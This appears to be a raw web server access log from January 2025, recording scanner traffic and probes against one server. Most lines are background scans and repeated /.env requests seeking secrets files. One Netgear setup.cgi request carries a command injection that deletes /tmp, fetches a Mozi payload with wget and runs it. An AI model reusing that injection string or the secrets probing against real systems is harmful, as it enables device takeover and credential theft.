78.153.140.93 - - [14/Jan/2025:10:23:40 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [14/Jan/2025:10:23:41 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
184.105.247.195 - - [14/Jan/2025:10:29:53 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15"
184.105.247.195 - - [14/Jan/2025:10:32:07 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Iron Safari/537.36"
184.105.247.195 - - [14/Jan/2025:10:32:39 +0000] "GET /geoserver/web/ HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15"
45.95.147.253 - - [14/Jan/2025:10:40:46 +0000] "GET / HTTP/1.0" 200 1761 "-" "ivre-masscan/1.3 https://github.com/robertdavidgraham/"
147.185.132.75 - - [14/Jan/2025:11:07:34 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
185.196.220.253 - - [14/Jan/2025:11:17:14 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
78.153.140.93 - - [14/Jan/2025:11:26:28 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [14/Jan/2025:11:26:29 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
185.12.59.118 - - [14/Jan/2025:12:35:14 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0"
78.153.140.93 - - [14/Jan/2025:12:57:30 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [14/Jan/2025:12:57:30 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
193.34.212.75 - - [14/Jan/2025:13:06:41 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
35.240.127.158 - - [14/Jan/2025:13:09:14 +0000] "GET / HTTP/1.1" 200 1003 "-" "python-requests/2.32.3"
139.59.101.104 - - [14/Jan/2025:13:17:03 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
95.214.55.226 - - [14/Jan/2025:13:21:38 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
46.19.138.234 - - [14/Jan/2025:14:05:29 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.93 - - [14/Jan/2025:14:15:19 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [14/Jan/2025:14:15:19 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
179.43.191.146 - - [14/Jan/2025:14:21:35 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
58.141.235.235 - - [14/Jan/2025:14:27:09 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
185.16.39.104 - - [14/Jan/2025:14:41:25 +0000] "GET / HTTP/1.1" 200 1003 "-" "-"
31.13.224.222 - - [14/Jan/2025:14:44:45 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Linux; Android 5.1.1; KYF39 Build/100.0.2039; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36"
185.196.220.253 - - [14/Jan/2025:14:51:26 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
78.153.140.93 - - [14/Jan/2025:14:57:50 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [14/Jan/2025:14:57:52 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
45.148.10.242 - - [14/Jan/2025:15:00:14 +0000] "GET / HTTP/1.1" 200 1742 "-" "Go-http-client/1.1"
193.34.212.75 - - [14/Jan/2025:15:13:27 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
13.91.50.116 - - [14/Jan/2025:15:13:27 +0000] "GET /druid/index.html HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
5.181.190.248 - - [14/Jan/2025:15:24:12 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
139.59.101.104 - - [14/Jan/2025:15:51:33 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
95.214.55.226 - - [14/Jan/2025:15:57:56 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
80.82.70.133 - - [14/Jan/2025:16:14:07 +0000] "\x16\x03\x02\x01o\x01" 400 526 "-" "-"
80.82.77.202 - - [14/Jan/2025:16:18:24 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5"
78.153.140.93 - - [14/Jan/2025:16:25:27 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [14/Jan/2025:16:25:28 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [14/Jan/2025:17:24:12 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [14/Jan/2025:17:24:12 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
193.34.212.75 - - [14/Jan/2025:17:40:09 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
59.99.193.60 - - [14/Jan/2025:17:45:04 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
78.153.140.93 - - [14/Jan/2025:18:00:13 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [14/Jan/2025:18:00:14 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
5.181.190.248 - - [14/Jan/2025:18:02:14 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
185.242.226.10 - - [14/Jan/2025:18:09:51 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
154.213.184.23 - - [14/Jan/2025:18:19:06 +0000] "CONNECT web.realsysadm.in:443 HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
18.217.104.52 - - [14/Jan/2025:18:26:00 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
217.142.184.125 - - [14/Jan/2025:18:56:08 +0000] "GET / HTTP/1.1" 200 966 "-" "Python/3.10 aiohttp/3.11.11"
51.15.19.173 - - [14/Jan/2025:19:19:46 +0000] "CONNECT web.realsysadm.in:443 HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
179.43.191.146 - - [14/Jan/2025:19:23:34 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.16.39.104 - - [14/Jan/2025:19:27:39 +0000] "GET / HTTP/1.1" 200 1003 "-" "-"
8.210.123.17 - - [14/Jan/2025:19:29:01 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
95.214.55.226 - - [14/Jan/2025:19:31:51 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
78.153.140.93 - - [14/Jan/2025:19:33:08 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [14/Jan/2025:19:33:08 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
188.166.165.226 - - [14/Jan/2025:19:34:29 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0"
46.19.138.234 - - [14/Jan/2025:19:37:19 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
43.153.122.30 - - [14/Jan/2025:19:42:10 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
49.51.233.46 - - [14/Jan/2025:20:08:59 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
5.181.190.248 - - [14/Jan/2025:20:11:26 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
117.208.154.119 - - [14/Jan/2025:20:39:25 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
78.153.140.93 - - [14/Jan/2025:21:00:00 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [14/Jan/2025:21:00:00 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
172.245.40.162 - - [14/Jan/2025:21:07:27 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; SnoopSecInspect/1.1; +https://snoopsec.us.to/)"
78.153.140.93 - - [14/Jan/2025:21:57:47 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [14/Jan/2025:21:57:47 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [14/Jan/2025:22:38:44 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [14/Jan/2025:22:38:45 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
80.82.77.202 - - [14/Jan/2025:23:02:12 +0000] "\x16\x03\x02\x01o\x01" 400 526 "-" "-"
13.64.58.178 - - [14/Jan/2025:23:27:10 +0000] "MGLNDD_35.220.248.27_80\n" 400 526 "-" "-"
185.226.197.7 - - [14/Jan/2025:23:33:45 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
205.210.31.226 - - [14/Jan/2025:23:38:49 +0000] "GET / HTTP/1.0" 200 1761 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
217.142.184.125 - - [14/Jan/2025:23:51:51 +0000] "GET / HTTP/1.1" 200 966 "-" "Python/3.10 aiohttp/3.11.11"
78.153.140.93 - - [13/Jan/2025:00:02:38 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [13/Jan/2025:00:02:39 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
178.215.236.132 - - [13/Jan/2025:00:04:11 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36"
78.153.140.93 - - [13/Jan/2025:00:26:15 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [13/Jan/2025:00:26:16 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
45.148.10.242 - - [13/Jan/2025:00:27:46 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
78.153.140.148 - - [13/Jan/2025:00:38:02 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [13/Jan/2025:00:38:02 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
92.255.57.58 - - [13/Jan/2025:00:42:13 +0000] "GET /actuator/gateway/routes HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
92.255.57.58 - - [13/Jan/2025:00:42:14 +0000] "GET / HTTP/1.1" 200 966 "http://35.220.248.27:80/actuator/gateway/routes" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
193.34.212.75 - - [13/Jan/2025:00:50:02 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
46.19.138.234 - - [13/Jan/2025:00:57:09 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
80.82.77.202 - - [13/Jan/2025:00:58:44 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (X11; FreeBSD i386; rv:28.0) Gecko/20100101 Firefox/28.0 SeaMonkey/2.25"
35.190.205.136 - - [13/Jan/2025:01:04:16 +0000] "GET / HTTP/1.1" 200 1003 "-" "python-requests/2.32.3"
185.16.39.104 - - [13/Jan/2025:01:10:11 +0000] "GET / HTTP/1.1" 200 1003 "-" "-"
80.82.77.202 - - [13/Jan/2025:01:11:43 +0000] "\x16\x03\x02\x01o\x01" 400 526 "-" "-"
78.153.140.93 - - [13/Jan/2025:01:21:06 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [13/Jan/2025:01:21:07 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
92.255.57.58 - - [13/Jan/2025:01:24:23 +0000] "\x16\x03\x01\x05\xa8\x01" 400 526 "-" "-"
5.181.190.248 - - [13/Jan/2025:01:28:52 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
195.3.223.55 - - [13/Jan/2025:01:29:40 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.148 - - [13/Jan/2025:01:40:48 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [13/Jan/2025:01:40:48 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
95.214.55.226 - - [13/Jan/2025:01:43:16 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
71.6.232.24 - - [13/Jan/2025:01:44:11 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36"
78.153.140.93 - - [13/Jan/2025:02:24:56 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [13/Jan/2025:02:24:56 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
167.94.146.63 - - [13/Jan/2025:02:28:42 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
167.94.146.63 - - [13/Jan/2025:02:28:45 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.146.63 - - [13/Jan/2025:02:28:46 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.146.63 - - [13/Jan/2025:02:28:46 +0000] "GET / HTTP/1.1" 200 966 "http://35.220.248.27/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.146.63 - - [13/Jan/2025:02:28:47 +0000] "PRI * HTTP/2.0" 400 526 "-" "-"
195.178.110.109 - - [13/Jan/2025:02:31:43 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
195.178.110.109 - - [13/Jan/2025:02:33:01 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
5.181.190.248 - - [13/Jan/2025:02:37:51 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
48.217.212.13 - - [13/Jan/2025:02:39:44 +0000] "GET /ReportServer HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
5.95.55.4 - - [13/Jan/2025:02:53:22 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.148 - - [13/Jan/2025:03:06:52 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [13/Jan/2025:03:06:53 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
13.91.181.242 - - [13/Jan/2025:03:12:01 +0000] "GET /hudson HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
178.128.54.126 - - [13/Jan/2025:03:13:45 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
178.128.54.126 - - [13/Jan/2025:03:13:51 +0000] "\x16\x03\x01\x01\v\x01" 400 526 "-" "-"
150.9.192.197 - - [13/Jan/2025:03:24:16 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.93 - - [13/Jan/2025:03:26:06 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [13/Jan/2025:03:26:07 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
83.222.191.146 - - [13/Jan/2025:03:33:27 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
45.148.10.242 - - [13/Jan/2025:03:35:49 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
193.34.212.75 - - [13/Jan/2025:04:24:59 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
78.153.140.93 - - [13/Jan/2025:04:50:06 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [13/Jan/2025:04:50:07 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [13/Jan/2025:05:05:02 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [13/Jan/2025:05:05:02 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
115.231.78.7 - - [13/Jan/2025:05:06:24 +0000] "GET / HTTP/1.1" 200 1798 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.2623.112 Safari/537.36"
115.231.78.7 - - [13/Jan/2025:05:06:24 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
115.231.78.7 - - [13/Jan/2025:05:06:24 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
115.231.78.7 - - [13/Jan/2025:05:06:24 +0000] "GET / HTTP/1.1" 200 966 "http://35.220.248.27:80/favicon.ico" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
115.231.78.7 - - [13/Jan/2025:05:06:25 +0000] "GET /robots.txt HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
115.231.78.7 - - [13/Jan/2025:05:06:25 +0000] "GET /js/brand.js HTTP/1.1" 200 533 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
115.231.78.7 - - [13/Jan/2025:05:06:25 +0000] "GET /js/login.js HTTP/1.1" 200 885 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
45.148.10.242 - - [13/Jan/2025:05:09:34 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
27.111.75.250 - - [13/Jan/2025:05:17:48 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 302 350 "-" "-"
198.235.24.10 - - [13/Jan/2025:05:18:42 +0000] "GET / HTTP/1.0" 200 1761 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
5.181.190.248 - - [13/Jan/2025:05:31:31 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
91.223.3.201 - - [13/Jan/2025:05:31:46 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.93 - - [13/Jan/2025:05:33:20 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [13/Jan/2025:05:33:21 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
179.43.191.146 - - [13/Jan/2025:05:37:29 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
86.160.9.38 - - [13/Jan/2025:05:45:26 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
